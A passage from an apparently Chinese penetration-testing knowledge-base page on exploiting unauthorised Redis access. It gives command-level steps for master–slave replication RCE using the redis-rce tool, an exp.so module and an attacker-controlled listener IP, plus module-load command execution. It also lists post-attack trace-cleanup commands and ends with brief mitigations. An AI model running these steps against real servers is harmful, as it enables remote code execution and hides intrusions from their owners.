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" width="420" height="180" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="前期总结">前期总结<a href="#前期总结" class="hash-link" aria-label="前期总结的直接链接" title="前期总结的直接链接">​</a></h2>
<p>redis未授权访问总的来说危害还是挺大的</p>
<p>但是实际过程中还是会遇到很多很多的问题</p>
<p>比如</p>
<ul>
<li>redis数据量稍微大一点，写shell到文件之后，php因为文件太大是会拒绝执行的</li>
<li>redis写入的时候就会覆盖passwd，而且passwd不能恢复</li>
<li>debian,ubuntu 计划任务的限制很严格，写入成功是不能执行的</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="高级利用">高级利用<a href="#高级利用" class="hash-link" aria-label="高级利用的直接链接" title="高级利用的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="主从复制getshell">主从复制Getshell<a href="#主从复制getshell" class="hash-link" aria-label="主从复制Getshell的直接链接" title="主从复制Getshell的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="介绍">介绍<a href="#介绍" class="hash-link" aria-label="介绍的直接链接" title="介绍的直接链接">​</a></h4>
<p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，<strong>其中主机和从机数据相同，而从机只负责读，主机只负责写</strong>，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
<p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；<strong>数据的复制是单向的，只能由主节点到从节点。</strong></p>
<p>默认情况下，每台Redis服务器都是主节点；且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点。</p>
<p><strong>主从复制RCE主要原理就是：攻击机通过协议认证成为主节点，目标redis服务器为从节点，通过全量复制将文件内容输出到目标服务器上(也就是写入so文件)。然后加载.so文件，完成命令执行。</strong></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="环境搭建-1">环境搭建<a href="#环境搭建-1" class="hash-link" aria-label="环境搭建的直接链接" title="环境搭建的直接链接">​</a></h4>
<p>采用docker拉取redis进行一键式搭建</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">6378</span><span class="token plain">:6379 </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> redis:latest</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="docker启动成功" src="/assets/images/image-20211103171924253-283598a3bf61a6befaa5aca1a3859c2a.png" width="1449" height="38" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="漏洞利用">漏洞利用<a href="#漏洞利用" class="hash-link" aria-label="漏洞利用的直接链接" title="漏洞利用的直接链接">​</a></h4>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="下载exp">下载Exp<a href="#下载exp" class="hash-link" aria-label="下载Exp的直接链接" title="下载Exp的直接链接">​</a></h5>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">git</span><span class="token plain"> clone https://github.com/Ridter/redis-rce.git</span><br></span></code></pre></div></div>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="下载-expso">下载 <code>exp.so</code><a href="#下载-expso" class="hash-link" aria-label="下载-expso的直接链接" title="下载-expso的直接链接">​</a></h5>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 下载后放到 redis-rce 目录下</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">wget</span><span class="token plain"> --no-chck-certificate https://github.com/n0b0dyCN/redis-rogue-server/raw/master/exp.so</span><br></span></code></pre></div></div>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="利用">利用<a href="#利用" class="hash-link" aria-label="利用的直接链接" title="利用的直接链接">​</a></h5>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 此处可以通过 -p 去设置目标端口（默认6379）</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python redis-rce.py </span><span class="token parameter variable" style="color:#36acaa">-r</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">目标IP</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-L</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">监听的公网IP</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-P</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">监听的公网端口</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> exp.so</span><br></span></code></pre></div></div>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="成功截图">成功截图<a href="#成功截图" class="hash-link" aria-label="成功截图的直接链接" title="成功截图的直接链接">​</a></h5>
<p><img decoding="async" loading="lazy" alt="image-20211103172253238" src="/assets/images/image-20211103172253238-97e85be110adb4779eb704965c35e97d.png" width="1001" height="382" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="数据备份痕迹清理">数据备份&amp;痕迹清理<a href="#数据备份痕迹清理" class="hash-link" aria-label="数据备份&amp;痕迹清理的直接链接" title="数据备份&amp;痕迹清理的直接链接">​</a></h4>
<p>攻击前先确定各种配置信息</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">CONFIG get *    # 获取所有的配置</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CONFIG get dir   # 获取 快照文件 保存的 位置</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CONFIG get dbfilename   # 获取 快照文件 的文件名</span><br></span></code></pre></div></div>
<p>攻击后对数据进行恢复，恢复的内容从上方的命令中获取</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#切断主从，关闭复制功能</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">slaveof no one </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#恢复目录</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">config </span><span class="token builtin class-name">set</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">dir</span><span class="token plain"> /data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#通过dump.rdb文件恢复数据</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">config </span><span class="token builtin class-name">set</span><span class="token plain"> dbfilename dump.rdb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#删除exp.so</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">system.exec </span><span class="token string" style="color:#e3116c">&#x27;rm ./exp.so&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#卸载system模块的加载</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">module unload system</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="漏洞原理">漏洞原理<a href="#漏洞原理" class="hash-link" aria-label="漏洞原理的直接链接" title="漏洞原理的直接链接">​</a></h4>
<p><code>Pavel Toporkov</code>在2018年的<code>zeronights</code>会议上，分享了关于这个漏洞的详细原理。</p>
<p>PDF链接：<a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener noreferrer">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></p>
<p><img decoding="async" loading="lazy" alt="image-20211103173226945" src="/assets/images/image-20211103173226945-52ce0d4bf9443546f0dcd423d580dac9.png" width="1718" height="1930" class="img_ev3q"></p>
<p>看了个大概，也不是完全懂，大概意思就是说，我们做主机，目标做从机，当两个Redis实例设置主从模式的时候，Redis的主机实例可以通过<code>FULLRESYNC</code>同步文件到从机上，然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="模块加载执行命令">模块加载执行命令<a href="#模块加载执行命令" class="hash-link" aria-label="模块加载执行命令的直接链接" title="模块加载执行命令的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="介绍-1">介绍<a href="#介绍-1" class="hash-link" aria-label="介绍的直接链接" title="介绍的直接链接">​</a></h4>
<p>和主从复制差不多，都是加载一样的<code>so</code>文件，只不过这边是直接模块导入的方法</p>
<p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。</p>
<p><strong>主要过程还是通过某种手法上传<code>.so文件</code>，然后通过redis的<code>module命令</code>进行加载<code>.so文件</code>，然后进行系统命令执行，这里主要是讲解利用方式，我就不对.so文件原理进行一个讲解。</strong></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="什么时候用">什么时候用<a href="#什么时候用" class="hash-link" aria-label="什么时候用的直接链接" title="什么时候用的直接链接">​</a></h4>
<ol>
<li>实战中这种用法一般用在getshell后，上传.so文件进行一个命令执行；</li>
<li>版本够，但是不能用主从复制rce的时候用，不能出网的时候用；</li>
</ol>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="expso">exp.so<a href="#expso" class="hash-link" aria-label="exp.so的直接链接" title="exp.so的直接链接">​</a></h4>
<p>下载后自己make编译即可</p>
<ul>
<li><a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand" target="_blank" rel="noopener noreferrer">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></li>
<li><a href="https://github.com/1979139113/RedisModules-ExecuteCommand" target="_blank" rel="noopener noreferrer">fork</a></li>
</ul>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="复现">复现<a href="#复现" class="hash-link" aria-label="复现的直接链接" title="复现的直接链接">​</a></h4>
<ul>
<li>启动redis容器</li>
</ul>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:#36acaa">-it</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">--rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1:6379:6379 redis</span><br></span></code></pre></div></div>
<ul>
<li>查看版本，符合要求</li>
</ul>
<p><img decoding="async" loading="lazy" alt="image-20211103215141222" src="/assets/images/image-20211103215141222-768c997ce62fece2fa71cc547c4abed4.png" width="1266" height="436" class="img_ev3q"></p>
<ul>
<li>下载远程的仓库进行编译</li>
</ul>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">git</span><span class="token plain"> clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> RedisModules-ExecuteCommand</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">make</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211103215159025" src="/assets/images/image-20211103215159025-f913ab0127e36dfaae8fcb654dc2b08a.png" width="1536" height="644" class="img_ev3q"></p>
<ul>
<li>把编译好的so文件放到redis的容器内</li>
</ul>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">docker</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">cp</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211103215223592" src="/assets/images/image-20211103215223592-5ec122d244e6a297062a51a865f5c719.png" width="1944" height="302" class="img_ev3q"></p>
<ul>
<li>加载so，执行命令</li>
</ul>
<p><img decoding="async" loading="lazy" alt="image-20211103215237224" src="/assets/images/image-20211103215237224-28213855ceed4dde29eb8846d6678898.png" width="1396" height="802" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="防护">防护<a href="#防护" class="hash-link" aria-label="防护的直接链接" title="防护的直接链接">​</a></h2>
<p>从上面的利用也可以看的出来，防护主要针对以下几点：</p>
<ol>
<li>禁止未授权访问，设置密码</li>
<li>低权限运行，避免RCE等</li>
<li>禁止数据库对外开放，设置访问IP白名单</li>
</ol>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="参考">参考<a href="#参考" class="hash-link" aria-label="参考的直接链接" title="参考的直接链接">​</a></h2>
<ul>
<li><a href="https://xz.aliyun.com/t/8018#toc-10" target="_blank" rel="noopener noreferrer">redis数据库在渗透中的利用</a></li>
<li><a href="https://mp.weixin.qq.com/s/YPLnYWsBMAYij7wXHVpodg" target="_blank" rel="noopener noreferrer">Redis主从复制RCE影响分析</a></li>
</ul></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"></div><div class="col lastUpdated_JAkA"><span class="theme-last-updated">最后<!-- -->由 <b>d4m1ts</b> <!-- -->于 <b><time datetime="2025-06-01T13:27:30.000Z" itemprop="dateModified">2025年6月1日</time></b> <!-- -->更新</span></div></div></footer></article><nav class="pagination-nav" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/渗透测试/WEB漏洞/未授权访问/未授权访问漏洞总结"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">未授权访问漏洞总结</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/渗透测试/WEB漏洞/条件竞争/"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">条件竞争</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#危害" class="table-of-contents__link toc-highlight">危害</a></li><li><a href="#环境准备" class="table-of-contents__link toc-highlight">环境准备</a></li><li><a href="#信息泄露" class="table-of-contents__link toc-highlight">信息泄露</a><ul><li><a href="#数据泄露" class="table-of-contents__link toc-highlight">数据泄露</a></li><li><a href="#系统信息泄露" class="table-of-contents__link toc-highlight">系统信息泄露</a></li></ul></li><li><a href="#写文件getshell" class="table-of-contents__link toc-highlight">写文件GetShell</a><ul><li><a href="#在web目录中写入webshell" class="table-of-contents__link toc-highlight">在Web目录中写入webshell</a><ul><li><a href="#环境搭建" class="table-of-contents__link toc-highlight">环境搭建</a></li><li><a href="#getshell" class="table-of-contents__link toc-highlight">getshell</a></li></ul></li><li><a href="#写入ssh公钥直接连接" class="table-of-contents__link toc-highlight">写入SSH公钥直接连接</a><ul><li><a href="#在本地生成公钥和私钥" class="table-of-contents__link toc-highlight">在本地生成公钥和私钥</a></li><li><a href="#将公钥写入文件中" class="table-of-contents__link toc-highlight">将公钥写入文件中</a></li><li><a href="#ssh-连接" class="table-of-contents__link toc-highlight">ssh 连接</a></li></ul></li><li><a href="#写入计划任务corntab反弹shell" class="table-of-contents__link toc-highlight">写入计划任务(corntab)反弹shell</a><ul><li><a href="#注意️" class="table-of-contents__link toc-highlight">注意⚠️</a></li><li><a href="#执行命令" class="table-of-contents__link toc-highlight">执行命令</a></li><li><a href="#攻击开启监听" class="table-of-contents__link toc-highlight">攻击🐔开启监听</a></li><li><a href="#等待-1-分钟" class="table-of-contents__link toc-highlight">等待 1 分钟</a></li></ul></li></ul></li><li><a href="#前期总结" class="table-of-contents__link toc-highlight">前期总结</a></li><li><a href="#高级利用" class="table-of-contents__link toc-highlight">高级利用</a><ul><li><a href="#主从复制getshell" class="table-of-contents__link toc-highlight">主从复制Getshell</a><ul><li><a href="#介绍" class="table-of-contents__link toc-highlight">介绍</a></li><li><a href="#环境搭建-1" class="table-of-contents__link toc-highlight">环境搭建</a></li><li><a href="#漏洞利用" class="table-of-contents__link toc-highlight">漏洞利用</a><ul><li><a href="#下载exp" class="table-of-contents__link toc-highlight">下载Exp</a></li><li><a href="#下载-expso" class="table-of-contents__link toc-highlight">下载 <code>exp.so</code></a></li><li><a href="#利用" class="table-of-contents__link toc-highlight">利用</a></li><li><a href="#成功截图" class="table-of-contents__link toc-highlight">成功截图</a></li></ul></li><li><a href="#数据备份痕迹清理" class="table-of-contents__link toc-highlight">数据备份&amp;痕迹清理</a></li><li><a href="#漏洞原理" class="table-of-contents__link toc-highlight">漏洞原理</a></li></ul></li><li><a href="#模块加载执行命令" class="table-of-contents__link toc-highlight">模块加载执行命令</a><ul><li><a href="#介绍-1" class="table-of-contents__link toc-highlight">介绍</a></li><li><a href="#什么时候用" class="table-of-contents__link toc-highlight">什么时候用</a></li><li><a href="#expso" class="table-of-contents__link toc-highlight">exp.so</a></li><li><a href="#复现" class="table-of-contents__link toc-highlight">复现</a></li></ul></li></ul></li><li><a href="#防护" class="table-of-contents__link toc-highlight">防护</a></li><li><a href="#参考" class="table-of-contents__link toc-highlight">参考</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 d4m1ts 知识库.</div></div></div></footer></div>
</body>
</html>